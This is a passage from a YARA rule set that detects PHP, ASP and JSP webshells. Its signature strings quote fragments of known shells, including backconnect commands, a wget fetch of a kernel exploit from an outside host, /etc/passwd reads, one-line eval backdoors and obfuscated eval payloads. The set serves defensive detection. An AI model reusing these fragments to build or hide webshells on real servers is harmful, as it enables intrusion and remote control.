	$s7 = "p@gram Jm6h)"
	$s8 = "ser32.dllCONFP@"
condition:
	all of them
}
rule Php_Webshell_portlessinst
{
strings:
	$s2 = "Fail To Open Registry"
	$s3 = "f<-WLEggDr\""
	$s6 = "oMemoryCreateP"
condition:
	all of them
}
rule Php_Webshell_SetupBDoor
{
strings:
	$s1 = "\\BDoor\\SetupBDoor"
condition:
	all of them
}
rule Php_Webshell_phpshell_3
{
strings:
	$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
	$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
condition:
	all of them
}
rule Php_Webshell_BIN_Server
{
strings:
	$s0 = "configserver"
	$s1 = "GetLogicalDrives"
	$s2 = "WinExec"
	$s4 = "fxftest"
	$s5 = "upfileok"
	$s7 = "upfileer"
condition:
	all of them
}
rule Php_Webshell_HYTop2006_rar_Folder_2006
{
strings:
	$s6 = "strBackDoor = strBackDoor "
condition:
	all of them
}
rule Php_Webshell_r57shell_3
{
strings:
	$s1 = "<b>\".$_POST['cmd']"
condition:
	all of them
}
rule Php_Webshell_HDConfig
{
strings:
	$s0 = "An encryption key is derived from the password hash. "
	$s3 = "A hash object has been created. "
	$s4 = "Error during CryptCreateHash!"
	$s5 = "A new key container has been created."
	$s6 = "The password has been added to the hash. "
condition:
	all of them
}
rule Php_Webshell_FSO_s_ajan_2
{
strings:
	$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
	$s3 = "/file.zip"
condition:
	all of them
}
rule Php_Webshell_Webshell_and_Exploit_CN_APT_HK
{
strings:
	$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
	$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
	$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
condition:
	$a0 or ( all of ($s*) )
}
rule Jsp_Webshell_JSP_Browser_APT_webshell
{
strings:
	$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
	$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
	$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
	$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
condition:
	all of them
}
rule Jsp_Webshell_JSP_jfigueiredo_APT_webshell
{
strings:
	$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
	$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
condition:
	all of them
}
rule Jsp_Webshell_JSP_jfigueiredo_APT_webshell_2
{
strings:
	$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
	$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
	$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
	$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
condition:
	all of ($a*) or all of ($s*)
}
rule Php_Webshell_Webshell_Insomnia
{
strings:
	$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
	$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
	$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
	$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
	$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
	$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
	$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
	$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
condition:
	3 of them
}
rule Php_Webshell_HawkEye_PHP_Panel
{
strings:
	$s0 = "$fname = $_GET['fname'];" ascii fullword
	$s1 = "$data = $_GET['data'];" ascii fullword
	$s2 = "unlink($fname);" ascii fullword
	$s3 = "echo \"Success\";" fullword ascii
condition:
	all of ($s*) and filesize < 600
}
rule Php_Webshell_SoakSoak_Infected_Wordpress
{
strings:
	$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
	$s1 = "function FuncQueueObject()" ascii fullword
	$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
condition:
	all of ($s*)
}
rule Php_Webshell_Pastebin_Webshell
{
strings:
	$s0 = "file_get_contents(\"http://pastebin.com" ascii
	$s1 = "xcurl('http://pastebin.com/download.php" ascii
	$s2 = "xcurl('http://pastebin.com/raw.php" ascii
	$x0 = "if($content){unlink('evex.php');" ascii
	$x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
	$y0 = "file_put_contents($pth" ascii
	$y1 = "echo \"<login_ok>" ascii
	$y2 = "str_replace('* @package Wordpress',$temp" ascii
condition:
	1 of ($s*) or all of ($x*) or all of ($y*)
}
rule Asp_Webshell_ASPXspy2
{
strings:
	$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
	$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
	$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
	$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
	$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
	$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
	$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
	$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
	$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
	$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
	$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
	$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
	$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
	$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
condition:
	6 of them
}
rule Php_Webshell_Webshell_27_9_c66_c99
{
strings:
	$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
	$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
	$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
condition:
	filesize < 685KB and 1 of them
}
rule Php_Webshell_Webshell_acid_AntiSecShell_3
{
strings:
	$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
	$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
condition:
	filesize < 900KB and all of them
}
rule Php_Webshell_Webshell_c99_4
{
strings:
	$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
	$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
	$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
	$s4 = "$ret = myshellexec($handler);" fullword ascii
	$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
condition:
	filesize < 900KB and 1 of them
}
rule Php_Webshell_Webshell_r57shell_2
{
strings:
	$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
	$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
condition:
	filesize < 900KB and all of them
}
rule Php_Webshell_Webshell_27_9_acid_c99_locus7s
{
strings:
	$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
	$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
condition:
	filesize < 1711KB and 1 of them
}
rule Php_Webshell_Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57
{
strings:
	$s1 = "$_POST['cmd'] = which('" ascii
	$s2 = "$blah = ex(" fullword ascii
condition:
	filesize < 600KB and all of them
}
rule Php_Webshell_Webshell_c100
{
strings:
	$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
	$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
	$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
	$s4 = "which wget curl w3m lynx" ascii
	$s6 = "netstat -atup | grep IST"  ascii
condition:
	filesize < 685KB and 2 of them
}
rule Php_Webshell_Webshell_AcidPoison
{
strings:
	$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
condition:
	filesize < 550KB and all of them
}
rule Php_Webshell_Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256
{
strings:
	$s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
	$s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
condition:
	filesize < 882KB and all of them
}
rule Php_Webshell_Webshell_Ayyildiz
{
strings:
	$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
	$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
condition:
	filesize < 112KB and all of them
}
rule Php_Webshell_Webshell_zehir
{
strings:
	$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
	$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
condition:
	filesize < 200KB and 1 of them
}
rule Php_Webshell_UploadShell_98038f1efa4203432349badabad76d44337319a6
{
strings:
	$s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
	$s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
	$s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
condition:
	( uint16(0) == 0x3f3c and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}
rule Php_Webshell_DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3
{
strings:
	$s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
	$s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
condition:
	( uint16(0) == 0x3c0a and filesize < 300KB and all of them )
}
rule Php_Webshell_Unknown_8af033424f9590a15472a23cc3236e68070b952e
{
strings:
	$s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
	$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
	$s3 = "fwrite($fp,base64_decode('" ascii
condition:
	( uint16(0) == 0x6324 and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}
rule Php_Webshell_DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d
{
strings:
	$x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
	$x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
	$x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
	$s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
	$s9 = "$x = $_GET[\"x\"];" fullword ascii
condition:
	( uint16(0) == 0x3f3c and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}
rule Php_Webshell_WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901
{
strings:
	$s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
	$s2 = "input[type=text], input[type=password]{" fullword ascii
condition:
	( uint16(0) == 0x6c3c and filesize < 80KB and all of them )
}
rule Php_Webshell_webshell_e8eaf8da94012e866e51547cd63bb996379690bf
{
strings:
	$x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
	$x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
	$x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
condition:
	( uint16(0) == 0x213c and filesize < 100KB and 1 of ($x*) ) or ( 2 of them )
}
rule Php_Webshell_Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167
{
strings:
	$s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
	$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
	$s3 = "fwrite($fp,base64_decode('" ascii
condition:
	( uint16(0) == 0x6324 and filesize < 2KB and all of them )
}
rule Php_Webshell_WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7
{
strings:
	$s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
	$s9 = "$mosimage_session = \"" fullword ascii
condition:
	( uint16(0) == 0x3f3c and filesize < 300KB and all of them )
}
rule Php_Webshell_WebShell_Generic_1609_A
{
strings:
	$s1 = "return $qwery45234dws($b);" fullword ascii
condition:
	( uint16(0) == 0x3f3c and 1 of them )
}
rule Php_Webshell_Nishang_Webshell
{
strings:
	$s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
	$s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
	$s3 = "<title>Antak Webshell</title>" fullword ascii
	$s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii
condition:
	( uint16(0) == 0x253C and filesize < 100KB and 1 of ($s*) )
}
rule Jsp_Webshell_Webshell_Tiny_JSP_2
{
strings:
	$s1 = "<%eval(Request(" nocase
condition:
	uint16(0) == 0x253c and filesize < 40 and all of them
}
rule Php_Webshell_Wordpress_Config_Webshell_Preprend
{
strings:
	$x1 = " * @package WordPress" fullword ascii
	$s1 = "define('DB_NAME'," ascii
	$s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
	$fp1 = "iThemes Security Config" ascii
condition:
	uint32(0) == 0x68703f3c and filesize < 400KB and $x1 and all of ($s*) and not $x1 in (0..1000) and not 1 of ($fp*)
}
rule Php_Webshell_PAS_Webshell_Encoded
{
strings:
	$head1 = "<?php $____=" fullword ascii
	$head2 = "'base'.(32*2).'"
	$enc1 = "isset($_COOKIE['___']" ascii
	$enc2 = "if($___!==NULL){" ascii
	$enc3 = ").substr(md5(strrev($" ascii
	$enc4 = "]))%256);$" ascii
	$enc5 = "]))@setcookie('" ascii
	$enc6 = "]=chr(( ord($_" ascii
	/* = \x0A'));if(isset($_COOKIE[' */
	$x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 }
	$foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>"
	$foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>"
condition:
	( uint32(0) == 0x68703f3c and filesize < 80KB and ( 3 of them or $head1 at 0 or $head2 in (0..20) or 1 of ($x*) ) ) or $foot1 at (filesize-52) or $foot2 at (filesize-44)
}
rule Php_Webshell_ALFA_SHELL
{
strings:
	$x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
	$x2 = "#solevisible@gmail.com" fullword ascii
	$x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
	$x4 = "$GLOBALS['__ALFA__']" fullword ascii
	$x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
	$f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A }
condition:
	( filesize < 900KB and 2 of ($x*) or $f1 at (filesize-22) )
}
rule Php_Webshell_Webshell_FOPO_Obfuscation_APT_ON_Nov17_1
{
strings:
	$x1 = "Obfuscation provided by FOPO" fullword ascii
	$s1 = "\";@eval($" ascii
	$f1 = { 22 29 29 3B 0D 0A 3F 3E }
condition:
	uint16(0) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in (0..350) and $f1 at (filesize-23) ) )
}
rule Jsp_Webshell_WebShell_JexBoss_JSP_1
{
strings:
	$x1 = "equals(\"jexboss\")"
	$x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii
	$s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\""
	$s2 = "!= null && request.getHeader(\"user-agent\"" ascii
	$s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii
condition:
	uint16(0) == 0x253c and filesize < 1KB and 1 of ($x*) or 2 of them
}
rule Php_Webshell_WebShell_JexBoss_WAR_1
{
strings:
	$ = "jbossass" fullword ascii
	$ = "jexws.jsp" fullword ascii
	$ = "jexws.jspPK" fullword ascii
	$ = "jexws1.jsp" fullword ascii
	$ = "jexws1.jspPK" fullword ascii
	$ = "jexws2.jsp" fullword ascii
	$ = "jexws2.jspPK" fullword ascii
	$ = "jexws3.jsp" fullword ascii
	$ = "jexws3.jspPK" fullword ascii
	$ = "jexws4.jsp" fullword ascii
	$ = "jexws4.jspPK" fullword ascii
condition:
	uint16(0) == 0x4b50 and filesize < 4KB and 1 of them
}
rule Asp_Webshell_webshell_tinyasp
{
strings:
	$s1 = "Execute Request" ascii wide nocase
condition:
	uint16(0) == 0x253c and filesize < 150 and 1 of them
}
rule Asp_Webshell_WEBSHELL_ASPX_Mar21_1
{
strings:
	$s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword
	$s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
	$s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword
condition:
	uint16(0) == 0x253c and filesize < 6KB and all of them
}
rule Php_Webshell_webshell_php_obfuscated_fopo
{
strings:
	$payload = /(\beval[\t ]*\([^)]|\bassert[\t ]*\([^)])/ nocase ascii
	$one1 = "7QGV2YWwo" wide ascii
	$one2 = "tAZXZhbC" wide ascii
	$one3 = "O0BldmFsK" wide ascii
	$one4 = "sAQABlAHYAYQBsACgA" wide ascii
	$one5 = "7AEAAZQB2AGEAbAAoA" wide ascii
	$one6 = "OwBAAGUAdgBhAGwAKA" wide ascii
	$two1 = "7QGFzc2VydC" wide ascii
	$two2 = "tAYXNzZXJ0K" wide ascii
	$two3 = "O0Bhc3NlcnQo" wide ascii
	$two4 = "sAQABhAHMAcwBlAHIAdAAoA" wide ascii
	$two5 = "7AEAAYQBzAHMAZQByAHQAKA" wide ascii
	$two6 = "OwBAAGEAcwBzAGUAcgB0ACgA" wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 3000KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and $payload and ( any of ( $one* ) or any of ( $two* ) )
}
rule Php_Webshell_webshell_php_obfuscated_str_replace
{
strings:
	$payload1 = "str_replace" fullword wide ascii
	$payload2 = "function" fullword wide ascii
	$goto = "goto" fullword wide ascii
	$chr1 = "\\61" wide ascii
	$chr2 = "\\112" wide ascii
	$chr3 = "\\120" wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/  ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 300KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and any of ( $payload* ) and #goto > 1 and ( #chr1 > 10 or #chr2 > 10 or #chr3 > 10 )
}
rule Php_Webshell_webshell_in_image
{
strings:
	$png = { 89 50 4E 47 }
	$jpg = { FF D8 FF E0 }
	$gif = { 47 49 46 38 }
	$gif2 = "gif89"
	$mdb = { 00 01 00 00 53 74 }
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$cpayload1 = /\beval[\t ]*\([^)]/ nocase ascii
	$cpayload2 = /\bexec[\t ]*\([^)]/ nocase ascii
	$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase ascii
	$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase ascii
	$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase ascii
	$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase ascii
	$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase ascii
	$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase ascii
	$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase ascii
	$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase ascii
	$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase ascii
	$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase ascii
	$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase ascii
	$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
	$php_multi_write1 = "fopen(" wide ascii
	$php_multi_write2 = "fwrite(" wide ascii
	$php_write1 = "move_uploaded_file" fullword wide ascii
condition:
	( $png at 0 or $jpg at 0 or $gif at 0 or $gif2 at 0 or $mdb at 0 ) and ( ( ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and ( ( any of ( $cpayload* ) or all of ( $m_cpayload_preg_filter* ) ) or ( any of ( $php_write* ) or all of ( $php_multi_write* ) ) ) ) )
}
rule Php_Webshell_Tools_cmd
{
strings:
	$s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
	$s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
	$s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
	$s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
	$s4 = "while((a=in.read(b))!=-1){" fullword ascii
	$s5 = "out.println(new String(b));" fullword ascii
	$s6 = "out.print(\"</pre>\");" fullword ascii
	$s7 = "out.print(\"<pre>\");" fullword ascii
	$s8 = "int a = -1;" fullword ascii
	$s9 = "byte[] b = new byte[2048];" fullword ascii
condition:
	filesize < 3KB and 7 of them
}
rule Php_Webshell_trigger_drop
{
strings:
	$s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
	$s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
	$s2 = "@mssql_query('DROP TRIGGER" ascii
	$s3 = "if(empty($_GET['returnto']))" fullword ascii
condition:
	filesize < 5KB and all of them
}
rule Php_Webshell_InjectionParameters
{
strings:
	$s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
	$s1 = "Public Class InjectionParameters" fullword ascii
condition:
	filesize < 13KB and all of them
}
rule Php_Webshell_users_list
{
strings:
	$s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
	$s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
	$s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
condition:
	filesize < 12KB and all of them
}
rule Php_Webshell_trigger_modify
{
strings:
	$s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
	$s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
	$s3 = "if($_POST['query'] != '')" fullword ascii
	$s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
	$s5 = "<b>Modify Trigger</b>" fullword ascii
condition:
	filesize < 15KB and all of them
}
rule Php_Webshell_Customize
{
strings:
	$s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
	$s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
	$s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
	$s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
condition:
	filesize < 24KB and all of them
}
rule Php_Webshell_oracle_data
{
strings:
	$s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
	$s1 = "if(isset($_REQUEST['id']))" fullword ascii
	$s2 = "$id=$_REQUEST['id'];" fullword ascii
condition:
	all of them
}
rule Php_Webshell_reDuhServers_reDuh
{
strings:
	$s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
	$s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
	$s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
condition:
	filesize < 116KB and all of them
}
rule Php_Webshell_item_old
{
strings:
	$s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
	$s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
	$s3 = "$sHash = md5($sURL);" fullword ascii
condition:
	filesize < 7KB and 2 of them
}
rule Php_Webshell_Tools_2014
{
strings:
	$s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
	$s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
	$s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
condition:
	filesize < 715KB and all of them
}
rule Php_Webshell_reDuhServers_reDuh_2
{
strings:
	$s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
	$s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
	$s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
condition:
	filesize < 57KB and all of them
}
rule Php_Webshell_Customize_2
{
strings:
	$s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
	$s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
condition:
	filesize < 30KB and all of them
}
rule Php_Webshell_ChinaChopper_one
{
strings:
	$s0 = "<%eval request(" fullword ascii
condition:
	filesize < 50 and all of them
}
rule Php_Webshell_CN_Tools_old
{
strings:
	$s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
	$s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
	$s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
	$s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
condition:
	filesize < 6KB and all of them
}
rule Php_Webshell_item_301
{
strings:
	$s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
	$s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
	$s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
	$s4 = "$sURL = $aArg[0];" fullword ascii
condition:
	filesize < 3KB and 3 of them
}
rule Php_Webshell_CN_Tools_item
{
strings:
	$s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
	$s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
	$s3 = "$sWget=\"index.asp\";" fullword ascii
